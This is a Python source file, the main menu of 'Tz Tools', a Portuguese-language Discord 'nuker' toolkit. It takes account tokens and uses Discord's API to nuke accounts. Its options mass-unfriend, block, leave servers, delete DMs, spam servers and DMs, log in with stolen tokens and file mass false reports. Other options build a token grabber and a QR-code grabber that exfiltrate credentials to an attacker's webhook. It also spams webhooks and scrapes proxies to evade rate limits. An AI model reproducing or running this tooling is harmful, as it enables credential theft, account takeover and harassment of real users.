# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Tools sob a Licença Pública Geral GNU v2 (1991).

import multiprocessing
import threading
import requests
import keyboard
import base64
import os

from time import sleep
from colorama import Fore
from signal import signal, SIGINT

from util.plugins.common import *
import util.accountNuke
import util.dmdeleter
import util.info
import util.login
import util.groupchat_spammer
import util.massreport
import util.QR_Grabber
import util.seizure
import util.server_leaver
import util.spamservers
import util.profilechanger
import util.friend_blocker
import util.create_token_grabber
import util.unfriender
import util.webhookspammer
import util.massdm

threads = 3
cancel_key = "ctrl+x"

def main():
    setTitle(f"Tz Tools {THIS_VERSION}")
    clear()
    global threads
    global cancel_key
    if getTheme() == "verde":
        banner()
    elif getTheme() == "escuro":
        banner("escuro")
    elif getTheme() == "vermelho":
        banner("vermelho")
    elif getTheme() == "azul":
        banner("azul")
    elif getTheme() == "neon":
        banner("neon")

    choice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Escolha: {Fore.RED}')
    #all options
    if choice == "1":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        Server_Name = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Nome dos servidores que serão criados: {Fore.RED}'))
        message_Content = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Mensagem que será enviada a todos os amigos: {Fore.RED}'))
        if threading.active_count() < threads:
            threading.Thread(target=util.accountNuke.Tz_Nuke, args=(token, Server_Name, message_Content)).start()
            return


    elif choice == '2':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        #verifique se eles estão sozinhos e não têm amigos
        if not requests.get("https://discord.com/api/v9/users/@me/relationships", headers=getheaders(token)).json():
            print(f"")
            sleep(3)
            main()
        #conseguir todos os amigos        
        processes = []
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        if not friendIds:
            print(f"{Fore.RESET}Porra, esse cara é solitário, ele não tem amigos ")
            sleep(3)
            main()
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(target=util.unfriender.UnFriender, args=(token, friend))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        sleep(1.5)
        main()


    elif choice == '3':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        if token.startswith("mfa."):
            print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Tz não poderá excluir os servidores, pois a conta tem 2fa ativado')
            sleep(3)
        processes = []
        #obter todos os servidores
        guildsIds = requests.get("https://discord.com/api/v8/users/@me/guilds", headers=getheaders(token)).json()
        if not guildsIds:
            print(f"{Fore.RESET}Porra, esse cara não está em nenhum servidor")
            sleep(3)
            main()
        for guild in [guildsIds[i:i+3] for i in range(0, len(guildsIds), 3)]:
            t = threading.Thread(target=util.server_leaver.Leaver, args=(token, guild))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        sleep(1.5)
        main()
                

    elif choice == '4':
        token = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.BLUE}Você quer ter um ícone para os servidores que serão criados?')
        yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
        if yesno.lower() == "y" or yesno.lower() == "yes":
            image = input(f'Exemplo: (C:\\Users\\myName\\Desktop\\TzNuker\\ShitOn.png):\n{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Por favor, insira a localização do ícone: {Fore.RED}')
            if not os.path.exists(image):
                print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Não foi possível\'encontrar "{image}" no seu computador')
                sleep(3)
                main()
            with open(image, "rb") as f: _image = f.read()
            b64Bytes = base64.b64encode(_image)
            icon = f"data:image/x-icon;base64,{b64Bytes.decode()}"
        else:
            icon = None
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Nomes de servidores aleatórios
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Nomes de servidor personalizados  
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Segunda chance: {Fore.RED}')
        if secondchoice not in ["1", "2"]:
            print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Segunda escolha inválida')
            sleep(1)
            main()
        if secondchoice == "1":
            amount = 25
            processes = []
            if hasNitroBoost(token):
                amount = 50
            for i in range(amount):
                t = threading.Thread(target=util.spamservers.SpamServers, args=(token, icon))
                t.start()
                processes.append(t)
            for process in processes:
                process.join()
            sleep(1.5)
            main()

        if secondchoice == "2":
            name = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Nome dos servidores que serão criados: {Fore.RED}')
            processes = []
            for i in range(25):
                t = threading.Thread(target=util.spamservers.SpamServers, args=(token, icon, name))
                t.start()
                processes.append(t)
            for process in processes:
                process.join()
            sleep(1.5)
            main()


    elif choice == '5':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Porra, esse cara é solitário, ele não tem dm's ")
            sleep(3)
            main()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
                t = threading.Thread(target=util.dmdeleter.DmDeleter, args=(token, channel))
                t.start()
                processes.append(t)
        for process in processes:
            process.join()
        sleep(1.5)
        main()


    elif choice == '6':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        message = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Mensagem que será enviada a todos os amigos: {Fore.RED}'))
        processes = []
        channelIds = requests.get("https://discord.com/api/v9/users/@me/channels", headers=getheaders(token)).json()
        if not channelIds:
            print(f"{Fore.RESET}Porra, esse cara é solitário, ele não tem dm's ")
            sleep(3)
            main()
        for channel in [channelIds[i:i+3] for i in range(0, len(channelIds), 3)]:
            t = threading.Thread(target=util.massdm.MassDM, args=(token, channel, message))
            t.start()
            processes.append(t)
        sleep(1.5)
        main()


    elif choice == '7':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'{Fore.MAGENTA}Iniciando o modo de apreensão {Fore.RESET}{Fore.WHITE}(Ligar/desligar o modo claro/escuro){Fore.RESET}\n')
        SlowPrint(f"{Fore.RED}{cancel_key}{Fore.RESET} a qualquer momento para parar")
        processes = [] 
        for i in range(threads):
            t = multiprocessing.Process(target=util.seizure.StartSeizure, args=(token, ))
            t.start()
            processes.append(t)
        while True:
            if keyboard.is_pressed(cancel_key):
                for process in processes:
                    process.terminate()
                main()
                break

    elif choice == '8':
        token = input(
        f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.info.Info(token)


    elif choice == '9':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.login.TokenLogin(token)

    elif choice == '10':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        friendIds = requests.get("https://discord.com/api/v9/users/@me/relationships", proxies={"http": f'{proxy()}'}, headers=getheaders(token)).json()
        if not friendIds:
            print(f"{Fore.RESET}Porra, esse cara é solitário, ele não tem amigos ")
            sleep(3)
            main()
        processes = []
        for friend in [friendIds[i:i+3] for i in range(0, len(friendIds), 3)]:
            t = threading.Thread(target=util.friend_blocker.Block, args=(token, friend))
            t.start()
            processes.append(t)
        for process in processes:
            process.join()
        sleep(1.5)
        main()


    elif choice == '11':
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Trocador de status
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Trocador de bio
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] Trocador de HypeSquad    
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Opção escolhida: {Fore.RED}')
        if secondchoice not in ["1", "2", "3"]:
            print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Escolha inválida')
            sleep(1)
            main()
        if secondchoice == "1":
            status = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Status personalizado: {Fore.RED}')
            util.profilechanger.StatusChanger(token, status)

        if secondchoice == "2":
            bio = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}biografia personalizada: {Fore.RED}')
            util.profilechanger.BioChanger(token, bio)

        if secondchoice == "3":
            print(f'''
{Fore.RESET}[{Fore.MAGENTA}1{Fore.RESET}]{Fore.MAGENTA} HypeSquad Bravery
{Fore.RESET}[{Fore.RED}2{Fore.RESET}]{Fore.LIGHTRED_EX} HypeSquad Brilliance
{Fore.RESET}[{Fore.LIGHTGREEN_EX}3{Fore.RESET}]{Fore.LIGHTGREEN_EX} HypeSquad Balance
                        ''')
            thirdchoice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Hypesquad: {Fore.RED}')
            if thirdchoice not in ["1", "2", "3"]:
                print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Escolha inválida')
                sleep(1)
                main()
            if thirdchoice == "1":
                util.profilechanger.HouseChanger(token, 1)
            if thirdchoice == "2":
                util.profilechanger.HouseChanger(token, 2)
            if thirdchoice == "3":
                util.profilechanger.HouseChanger(token, 3)


    elif choice == '12':
        print(f"{Fore.RED}EM BREVE. . .\n{Fore.RESET}Junte-se ao Nosso Servidor (https://discord.gg/icegifs) para ver o que vai estar aqui!")
        sleep(4)
        main()


    elif choice == '13':
        WebHook = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        fileName = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Nome do arquivo: {Fore.RED}'))
        util.create_token_grabber.TokenGrabberV2(WebHook, fileName)


    elif choice == '14':
        WebHook = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook Url: {Fore.RED}')
        validateWebhook(WebHook)
        util.QR_Grabber.QR_Grabber(WebHook)


    elif choice == '15':
        print(f"\n{Fore.RED}(o token inserido é a conta que enviará os relatórios){Fore.RESET}")
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        guild_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}ID do servidor: {Fore.RED}'))
        channel_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}ID do canal: {Fore.RED}'))
        message_id1 = str(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}ID da mensagem: {Fore.RED}'))
        reason1 = str(input(
            '\n[1] Conteúdo ilegal\n'
            '[2] Assédio\n'
            '[3] Links de spam ou phishing\n'
            '[4] Auto-mutilação\n'
            '[5] Conteúdo NSFW\n\n'
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Reason: {Fore.RED}'))
        if reason1.upper() in ('1', 'ILLEGAL CONTENT'):
            reason1 = 0
        elif reason1.upper() in ('2', 'HARASSMENT'):
            reason1 = 1
        elif reason1.upper() in ('3', 'SPAM OR PHISHING LINKS'):
            reason1 = 2
        elif reason1.upper() in ('4', 'SELF-HARM'):
            reason1 = 3
        elif reason1.upper() in ('5', 'NSFW CONTENT'):
            reason1 = 4
        else:
            print(f"\nMotivo inválido")
            sleep(1)
            main()
        util.massreport.MassReport(token, guild_id1, channel_id1, message_id1, reason1)


    elif choice == "16":
        token = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Token: {Fore.RED}')
        validateToken(token)
        util.groupchat_spammer.GcSpammer(token)


    elif choice == '17':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Excluir Webhook
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Spammer de webhook    
                        ''')
        secondchoice = int(input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Segunda chance: {Fore.RED}'))
        if secondchoice not in [1, 2]:
            print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Segunda escolha inválida')
            sleep(1)
            main()
        if secondchoice == 1:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            try:
                requests.delete(WebHook)
                print(f'\n{Fore.GREEN}Webhook excluído com sucesso!{Fore.RESET}\n')
            except Exception as e:
                print(f'{Fore.RED}Erro: {Fore.WHITE}{e} {Fore.RED}aconteceu ao tentar excluir o Webhook')

            input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Digite qualquer coisa para continuar. . . {Fore.RED}')
            main()
        if secondchoice == 2:
            WebHook = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Webhook: {Fore.RED}')
            validateWebhook(WebHook)
            Message = str(input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Mensagem: {Fore.RED}'))
            util.webhookspammer.WebhookSpammer(WebHook, Message)


    elif choice == '18':
        print(f'''
    {Fore.RESET}[{Fore.RED}1{Fore.RESET}] Trocador de tema
    {Fore.RESET}[{Fore.RED}2{Fore.RESET}] Quantidade de threads
    {Fore.RESET}[{Fore.RED}3{Fore.RESET}] Cancelar chave
    {Fore.RESET}[{Fore.RED}4{Fore.RESET}] {Fore.RED}Sair...    
                        ''')
        secondchoice = input(
            f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Opção escolhida: {Fore.RED}')
        if secondchoice not in ["1", "2", "3", "4"]:
            print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Configuração inválida')
            sleep(1)
            main()
        if secondchoice == "1":
            print(f"""
{Fore.GREEN}Verde: 1
{Fore.LIGHTBLACK_EX}Escuro: 2
{Fore.RED}Vermelho: 3
{Fore.BLUE}Azul: 4
{Fore.CYAN}N{Fore.MAGENTA}e{Fore.CYAN}o{Fore.MAGENTA}n{Fore.CYAN}:{Fore.MAGENTA} 5
""")
            themechoice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}tema: {Fore.RED}')
            if themechoice == "1":
                setTheme('verde')
            elif themechoice == "2":
                setTheme('escuro')
            elif themechoice == "3":
                setTheme('vermelho')
            elif themechoice == "4":
                setTheme('azul')
            elif themechoice == "5":
                setTheme('neon')
            else:
                print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Tema inválido')
                sleep(1.5)
                main()
            SlowPrint(f"{Fore.GREEN}Tema definido para {Fore.CYAN}{getTheme()}")
            sleep(0.5)
            main()

        elif secondchoice == "2":
            print(f"{Fore.BLUE}Quantidade atual de threads: {threads}")
            try:
                amount = int(
                    input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Quantidade de threads: {Fore.RED}'))
            except ValueError:
                print(f'{Fore.RESET}[{Fore.RED}Erro{Fore.RESET}] : Montante inválido')
                sleep(1.5)
                main()
            if amount >= 45:
                print(f"{Fore.RED}Desculpe, mas ter tantas threads apenas limitará sua taxa e não acabará bem")
                sleep(3)
                main()
            elif amount >= 15:
                print(f"{Fore.RED}AVISO! * AVISO! * AVISO! * AVISO! * AVISO! * AVISO! * AVISO!")
                print(f"ter a quantidade de encadeamento definida para 15 ou mais pode ficar com lag e maior chance de limite de taxa\se tiver certeza de que deseja definir o limite de taxa para {Fore.YELLOW}{amount}{Fore.RED}?")
                yesno = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}yes/no: {Fore.RED}')
                if yesno.lower() != "yes":
                    sleep(0.5)
                    main()
            threads = amount
            SlowPrint(f"{Fore.GREEN}Threads definidos para {Fore.CYAN}{amount}")
            sleep(0.5)
            main()
        
        elif secondchoice == "3":
            print("\n","Info".center(30, "-"))
            print(f"{Fore.CYAN}Chave de cancelamento atual: {cancel_key}")
            print(f"""{Fore.BLUE}Se você quer ter ctrl + <key> você precisa digitar ctrl+<key> | NÃO pressione literalmente ctrl + <tecla>
{Fore.GREEN}Exemplo: shift+Q

{Fore.RED}Você pode ter outros modificadores em vez de ctrl ⇣
{Fore.YELLOW}Todos os modificadores de teclado:{Fore.RESET}
ctrl, shift, enter, esc, windows, left shift, right shift, left ctrl, right ctrl, alt gr, left alt, right alt
""")
            sleep(1.5)
            key = input(f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Chave: {Fore.RED}')
            cancel_key = key
            SlowPrint(f"{Fore.GREEN}Cancelar chave definida para {Fore.CYAN}{cancel_key}")
            sleep(0.5)
            main()

        elif secondchoice == "4":
            setTitle("Saindo. . .")
            choice = input(
                f'{Fore.GREEN}[{Fore.CYAN}>>>{Fore.GREEN}] {Fore.RESET}Você tem certeza que quer sair? (Y para confirmar): {Fore.RED}')
            if choice.upper() == 'Y':
                clear()
                os._exit(0)
            else:
                main()
    else:
        clear()
        main()

if __name__ == "__main__":
    def handler(signal, frame):
        print(Fore.RED + "\n\nAdeus!" + Fore.RESET)
        sleep(3)
        os._exit(0)
    signal(SIGINT, handler)
    import sys
    if os.path.basename(sys.argv[0]).endswith("exe"):
        
        with open(os.getenv("temp")+"\\tz_proxies", 'w'): pass
        if not os.path.exists(os.getenv("temp")+"\\tz_theme"):
            setTheme('verde')
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    try:
        assert sys.version_info >= (3,8)
    except AssertionError:
        print(f"{Fore.RED}Woopsie daisy, sua versão python ({sys.version_info[0]}.{sys.version_info[1]}.{sys.version_info[2]}) não é compatível com Tz nuker, faça o download do python 3.7+")
        sleep(5)
        print("saindo. . .")
        sleep(1.5)
        os._exit(0)
    else:
        
        with open(os.getenv("temp")+"\\tz_proxies", 'w'): pass
        if not os.path.exists(os.getenv("temp")+"\\tz_theme"):
            setTheme('verde')
        clear()
        proxy_scrape()
        sleep(1.5)
        main()
    finally:
        Fore.RESET

# Esse self foi orgulhosamente codificado por Tz (https://instagram.com/tzfofo).
# Copyright (c) 2021 🜲 Oi, eu sou o Tz#0001 | https://instagram.com/tzfofo
# Tz Tools sob a Licença Pública Geral GNU v2 (1991).
